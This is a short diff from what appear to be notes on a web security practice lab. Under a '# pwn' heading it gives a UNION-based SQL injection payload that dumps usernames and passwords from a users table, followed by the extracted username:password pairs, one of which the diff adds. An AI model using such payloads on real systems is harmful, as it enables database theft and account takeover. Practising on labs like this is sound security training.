@@ -106,6 +106,7 @@ username_wdkxnv
 # pwn
 Pets'+union+select+concat(username_wdkxnv,':',password_nruxzf),'nada'+from+users_fmnebg--
 
+carlos:01znvxvuiqopwydfln92
 wiener:mdcn7w1my9mdpnoc0l6m
 administrator:7qpk90futuka5actprm7
 ```
